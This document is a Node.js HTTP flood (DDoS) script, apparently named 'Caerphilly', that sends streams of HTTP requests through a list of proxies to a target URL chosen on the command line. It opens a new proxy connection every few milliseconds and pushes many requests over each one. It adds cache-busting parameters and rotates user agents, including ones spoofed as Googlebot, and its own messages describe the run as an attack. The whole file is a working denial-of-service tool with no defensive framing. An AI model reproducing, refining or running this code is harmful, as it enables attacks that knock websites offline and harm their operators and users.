///////////////@WilerHttpCC
process.on('uncaughtException', function() {})
process.on('unhandledRejection', function() {})
const fs = require('fs')
const url = require('url')
const net = require('net')
const path = require("path")
const execSync = require('child_process').execSync

try {
    chalk = require('chalk')
} catch (err) {
    console.log('\x1B[1m\x1B[33mInstalling the installation front\x1B[39m \x1B[1m\x1B[31mChalk\x1B[39m \x1B[1m\x1B[33mPlease wait...\x1B[39m')
    execSync('npm install chalk')
    console.log('\x1B[1m\x1B[32mFront-loaded\x1B[39m \x1B[1m\x1B[31mChalk\x1B[39m \x1B[1m\x1B[32mOnce the installation is complete, restart the script.\x1B[39m')
    process.exit()
}

const cyan = chalk.bold.cyan
const blue = chalk.bold.blue
const green = chalk.bold.green
const error = chalk.bold.red
const warning = chalk.bold.yellow
const magenta = chalk.bold.magenta
console.log(cyan('Caerphilly HTTP1.1 By:WilerHttpCC'))

if (process.argv.length !== 8) {
    console.log(error('Error: Command format is incorrect!'))
    console.log(warning('Example：node Caerphilly.js proxy.txt GET 10 60 http://cn.bing.com t'))
    console.log(green('Caerphilly HTTP1.1 By:WilerHttpCC'))
    process.exit()
}

const listFile = process.argv[2]
const methods = process.argv[3].toUpperCase()
const rate = process.argv[4]
const time = process.argv[5]
const target = process.argv[6]
const parsed = url.parse(target)
const parameter = process.argv[7] === "t"
//console.log(listFile, methods, rate, time, target, parsed, parameter)

if (!target !== !target.startsWith('http://') && !target.startsWith('https://')) {
    console.log(error('Error: Please enter the correct Destination (URL)'))
    process.exit()
}

try {
    proxies = fs.readFileSync(listFile, 'utf-8').toString().replace(/\r/g, '').split('\n')
} catch (err) {
    if (err.code !== 'ENOENT') throw err
    console.log(error(`Error: Proxy IP List (%s) Read failed!`), listFile)
    process.exit()
}
console.log(green(`Load the proxy IP list: `)+warning('%i'), proxies.length)

setTimeout(() => {
    console.log(error('End the attack '+magenta(methods)+' '+warning(target)+' ['+blue(parsed.host)+']，duration '+green(time)+' S'))
    process.exit()
}, time * 1000)

try {
    UAs = fs.readFileSync('ua.txt', 'utf-8').toString().replace(/\r/g, '').split('\n')
} catch (err) {
    if (err.code !== 'ENOENT') throw err
    console.log(warning('Warning: UA list (ua.txt) read failed using built-in UA list.'))
    UAs = [
        'Mozilla/5.0 (iPhone; CPU iPhone OS 9_1 like Mac OS X) AppleWebKit/601.1.46 (KHTML, like Gecko) Version/9.0 Mobile/13B143 Safari/601.1 (compatible; AdsBot-Google-Mobile; +http://www.google.com/mobile/adsbot.html)',
        'Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.96 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)',
        'Mozilla/5.0 (Linux; Android 5.0; SM-G920A) AppleWebKit (KHTML, like Gecko) Chrome Mobile Safari (compatible; AdsBot-Google-Mobile; +http://www.google.com/mobile/adsbot.html)',
        'Mozilla/5.0 (iPhone; CPU iPhone OS 12_1_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0 Mobile/15E148 Safari/604.1',
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.140 Safari/537.36 Edge/18.18247',
        'Mozilla/5.0 AppleWebKit/537.36 (KHTML, like Gecko; compatible; Googlebot/2.1; +http://www.google.com/bot.html) Safari/537.36',
        'Mozilla/5.0 (Linux; Android 9; BLA-L09) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36',
        'Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36',
        'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3599.0 Safari/537.36',
        'Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; .NET4.0C; .NET4.0E; rv:11.0) like Gecko',
        'Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)',
        'Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; rv:11.0) like Gecko',
    ]
}
console.log(green(`Load the UA list: `)+warning('%i'), UAs.length)


setInterval(function() {
    const proxy = proxies[Math.floor(Math.random() * proxies.length)].split(':')
    let socket = net.connect(proxy[1], proxy[0])

    socket.setKeepAlive(false, 0)
    socket.setTimeout(30000)

    socket.once('error', err => {
        //console.log('错误：'+err)
    })
    socket.once('disconnect', () => {
        //console.log('断开')
    })
    socket.once('data', data => {
        //console.log('返回：'+data)
    })

    let t = ''
    if (parameter) {
        t = '?t=' + Math.round(new Date())
    }

    for (let j = 0; j < rate; j++) {
        socket.write(methods + ' ' + parsed.path + t + ' HTTP/1.1\r\nHost: ' + parsed.host + '\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3\r\nuser-agent: ' + UAs[Math.floor(Math.random() * UAs.length)] + '\r\nUpgrade-Insecure-Requests: 1\r\nAccept-Encoding: gzip, deflate\r\nAccept-Language: en-US,en;q=0.9\r\nCache-Control: max-age=0\r\nConnection: Keep-Alive\r\n\r\n')
    }
    socket.on('data', function() {
        setTimeout(function() {
            socket.destroy()
            delete socket
        }, 30000)
    })
}, 5)

console.log(error('Initiating: ' + magenta(methods) + ' ' + warning(target) + ' [' + blue(parsed.host) + ']，Time ' + green(time) + ' S'))